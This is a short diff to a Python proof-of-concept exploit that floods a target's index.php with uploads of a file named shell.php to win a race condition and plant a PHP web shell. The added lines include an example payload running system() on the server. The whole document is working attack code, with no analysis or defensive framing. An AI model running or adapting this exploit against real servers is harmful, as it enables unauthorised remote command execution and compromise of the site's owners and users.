@@ -6,7 +6,14 @@ import string
 import sys
 
 print('[+] Trying to win the race')
-f = {'file': open('shell.php', 'rb')}
+try:
+    _payload_fh = open('shell.php', 'rb')
+except FileNotFoundError:
+    sys.exit("[!] shell.php not found next to this script.\n"
+             "    This PoC uploads that file, so you must supply it: write a PHP\n"
+             "    payload (e.g. <?php echo system('uptime'); ?>) to shell.php in\n"
+             "    this directory, then run again.")
+f = {'file': _payload_fh}
 for _ in range(4096 * 4096):
     requests.post('http://target.com/index.php?c=index.php', f)
 
